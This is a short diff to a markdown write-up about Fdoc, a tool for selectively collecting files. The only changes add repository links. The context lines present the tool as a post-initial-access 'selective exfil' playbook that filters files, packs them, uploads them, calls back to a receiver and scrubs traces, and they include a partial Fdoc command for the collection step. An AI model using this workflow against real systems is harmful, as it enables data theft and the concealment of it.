@@ -35,7 +35,7 @@ A concrete playbook: **right after initial access, run a short collection pass**
 
 Red-team exfil, pulling key evidence in IR, or ops “only grab this directory/file class”—all are **selective exfil**, not backup, not full-disk forensics.
 
-Fdoc is built for that: filter on target, pack, (optionally) upload, (optionally) callback the URL to a receiver, (optionally) scrub.
+[Fdoc](https://github.com/simonlee-hello/Fdoc) is built for that: filter on target, pack, (optionally) upload, (optionally) callback the URL to a receiver, (optionally) scrub.
 
 ## 2. Pain points addressed
 
@@ -162,7 +162,7 @@ Fdoc -d /data -e pdf,docx -t 2025-01-01 -o /tmp/docs.tgz \
   -scrub -q
 ```
 
-DNS shard format, encryption disk use, Windows SkipDirs, and related details follow the release notes / repo README.
+DNS shard format, encryption disk use, Windows SkipDirs, and related details: see the [Fdoc README](https://github.com/simonlee-hello/Fdoc).
 
 ## 6. Terminal demos
 
